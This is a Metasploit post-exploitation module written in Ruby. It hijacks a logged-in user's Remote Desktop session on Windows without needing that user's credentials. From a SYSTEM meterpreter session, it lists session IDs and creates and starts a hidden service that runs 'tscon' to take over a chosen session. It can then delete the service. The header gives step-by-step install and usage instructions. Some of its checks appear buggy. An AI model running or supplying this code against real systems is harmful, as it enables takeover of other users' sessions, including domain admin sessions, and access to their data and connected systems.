##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : korznikov_session_hijack.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : korznikov
# Tested on      : Windows 2008 | Windows 2012 | Windows 7 | Windows 10
# POC: http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
#
#
#
# [ DESCRIPTION ]
# A privileged user which can gain command execution with NT AUTHORITY/SYSTEM rights can hijack
# any currently logged in user's session, without any knowledge about his credentials. Terminal
# Services session can be either in connected or disconnected state. This is high risk vulnerability
# which allows any local admin to hijack a session and get access to:
# ---
# 1. Domain admin session.
# 2. Any unsaved documents, that hijacked user works on.
# 3. Any other systems/applications in which hijacked user previously logged in (May include another
# Remote Desktop sessions, Network Share mappings, applications which require another credentials).
# ---
#
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on  => set SESSION 3
# Check available IDs in target system      => set CHECK_ID true
# The Session ID to be hijacked (eg 1)      => set HIJACK_ID 1
# The service name to be created            => set SERVICE_NAME myservice
# Delete malicious service created?         => set DEL_SERVICE true
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/korznikov_session_hijack.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/korznikov_session_hijack.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/korznikov_session_hijack.rb
# msf post(korznikov_session_hijack) > info
# msf post(korznikov_session_hijack) > show options
# msf post(korznikov_session_hijack) > show advanced options
# msf post(korznikov_session_hijack) > set [option(s)]
# msf post(korznikov_session_hijack) > exploit
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb delete (optional)
# 3 - msfdb init   (optional)
# 4 - msfconsole
# 5 - reload_all
##




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry




# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'korznikov logon session hijack',
                        'Description'   => %q{
                                        A privileged user which can gain command execution with NT AUTHORITY/SYSTEM rights and can hijack any currently logged in user's session without any knowledge about his credentials. Terminal Services session can be either in connected or disconnected state.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover: korznikov',                   # vuln discover credits
                                ],
 
                        'Version'        => '$Revision: 1.2',
                        'DisclosureDate' => 'mar 21 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',    # requires a privilege session ..
                        'Targets'        =>
                                [
                                         # Tested againts Windows 10
                                         [ 'Windows 2008', 'Windows 2012', 'Windows 7', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '4', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',     # Default its to run againts session 1
                                         'HIJACK_ID' => '1',   # Default its to run againts user id 1
                                         'SERVICE_NAME' => 'sesshijack', # Default its to create sesshijack service
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('CHECK_ID', [ false, 'Check available IDs in target system' , false]),
                                OptBool.new('HIJACK_ID', [ false, 'The Session ID to be hijacked (eg 1)' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('SERVICE_NAME', [ true, 'The service name to be created (eg myservice)']),
                                OptBool.new('DEL_SERVICE', [ false, 'Delete malicious service created?' , false])
                        ], self.class) 


        end




# --------------------------
# CHECK TARGET IDs AVAILABLE
# --------------------------
def ls_stage1

  r=''
  session = client
  com_query = "query user" # net user 
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['CHECK_ID'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set CHECK_ID option!")
    return nil
  else
    print_status("Reporting logged users ids available!")
    Rex::sleep(1.5)
  end

    #
    # querying remote target logged users ids (cmd.exe)
    #
    print_good("  exec => cmd.exe /c #{com_query} ..")
    Rex::sleep(1.0)
    print_line("")
    r = session.sys.process.execute("cmd.exe /c #{com_query}", nil, {'Hidden' => true, 'Channelized' => true})

    # close channel when done
    print_line("")
    Rex::sleep(1.0)
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -----------------------------------------------
# GAIN REMOTE CODE EXCUTION BY CREATING A SERVICE
# -----------------------------------------------
def ls_stage2

  r=''
  session = client
  com_useid = datastore['HIJACK_ID']    # user id to be hijacked
  com_servi = datastore['SERVICE_NAME'] # service name to be created
  com_start = "net start #{com_servi}"  # start remote malicious service
  com_comps = "%systemdrive%\\system32\\cmd.exe" # cmd.exe compspec path
  com_execs = "sc create #{com_servi} binpath= \"#{com_comps} /k tscon #{com_useid} /dest:rdp-tcp#55\"" # create service
#
# com_execs = "tscon #{com_useid} /dest:#{User_acc_name}\"" # create service
#
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['HIJACK_ID'] == 'nil' || datastore['SERVICE_NAME'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set HIJACK_ID | SERVICE_NAME options!")
    return nil
  else
    print_status("Hijacking RDP process!")
    Rex::sleep(1.5)
  end

    #
    # TODO: check rdp service name in taskmanager
    # Search in target if service its active
    #
    print_warning("Searching RDP service existence ..")
    Rex::sleep(1.0)
    session.sys.process.get_processes().each do |x|
      if x['name'].downcase == "rdp.exe"
        print_good("  exec => process RDP found running ..")
        Rex::sleep(1.0)
      else
        # service not found running in target system
        print_error("[ABORT]: module cant find service ..")
        print_warning("System does not appear to be vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      end
    end

    #
    # Execute process hijacking in registry
    # sc create sesshijack binpath= "%systemdrive%\system32\cmd.exe /k tscon 1 /dest:rdp-tcp#55"
    #
    print_good("  exec => Creating service to gain code execution ..")
    Rex::sleep(1.0)
    print_good("  exec => #{com_execs}")
    r = session.sys.process.execute("cmd.exe /c #{com_execs}", nil, {'Hidden' => true, 'Channelized' => true})
    # give a proper time to refresh regedit 'enigma0x3' :D
    Rex::sleep(4.5)

      # start remote service to gain code execution
      print_good("  exec => Starting #{com_servi} service ..")
      Rex::sleep(1.0)
      r = session.sys.process.execute("cmd.exe /c #{com_start}", nil, {'Hidden' => true, 'Channelized' => true})

    # close channel when done
    print_status("Session hijack Credits: @korznikov")
    print_line("")
    Rex::sleep(1.0)
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# --------------------------------------------
# DELETE MALICIOUS SERVICE (session hijacking)
# --------------------------------------------
def ls_stage3

  r=''
  session = client
  com_servi = datastore['SERVICE_NAME'] # myservice
  com_delet = "sc delete #{com_servi}"  # malicious service to delete
  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{com_servi}" # malicious service hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEL_SERVICE'] == 'nil' || datastore['SERVICE_NAME'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DEL_SERVICE | SERVICE_NAME options!")
    return nil
  else
    print_status("Deleting malicious #{com_servi} service!")
    Rex::sleep(1.5)
  end

    #
    # TODO: check if it writes in HKLM or HKCU
    # search in target regedit for service existence ..
    #
    print_warning("Reading service hive registry keys ..")
    sleep(1.0)
    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{com_servi}")
      print_good("  exec => Remote service: #{com_servi} found ..")
      sleep(1.0)
    else
      print_error("[ ABORT ]: post-module cant find #{com_servi} in regedit ..")
      print_warning("Enter into a shell session and execute: sc qc #{com_servi}")
      print_line("")
      print_line("")
      # display remote service current settings...
      # cloning SC qc <ServiceName> display outputs...  
      print_line("SERVICE_NAME: #{com_servi}")
      print_line(" [SC] Query Service Failed 404: NOT FOUND ..")
      print_line("")
      print_line("")
    return nil
    end

      #
      # delete malicious service on target (cmd.exe)
      #
      print_good("  exec => #{com_delet}")
      Rex::sleep(1.0)
      r = session.sys.process.execute("cmd.exe /c #{com_delet}", nil, {'Hidden' => true, 'Channelized' => true})
      print_status("Service #{com_servi} successfully deleted ..")

    # close channel when done
    print_line("")
    Rex::sleep(1.0)
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end





# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd



    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    |   hijack currently logged in user session   |")
    print_line("    |            Author : r00t-3xp10it            |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: Non-Compatible system found ..")
      print_warning("This module only works againts windows systems")
      return nil
    end
    #
    # TODO: check if this works..
    # check for proper operative system (Windows 2008|2012|7|10)
    #
    if not sysinfo['OS'] =~ /Windows (2008|2012|7|10)/
      print_error("[ ABORT ]: Non-Compatible system found ..")
      print_warning("Vulnerable systems: Windows 2008|2012|7|10")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module requires a meterpreter session ..")
      return nil
    end
    #
    # check if we are running againts a priviliged session
    #
    if not runtor == "NT AUTHORITY\\SYSTEM"
      print_error("[ ABORT ]: This module requires a priviliged session ..")
      print_warning("This module requires NT AUTHORITY\\SYSTEM privs to run")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end



# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['CHECK_ID']
         ls_stage1
      end

      if datastore['HIJACK_ID']
         ls_stage2
      end

      if datastore['DEL_SERVICE']
         ls_stage3
      end
   end
end
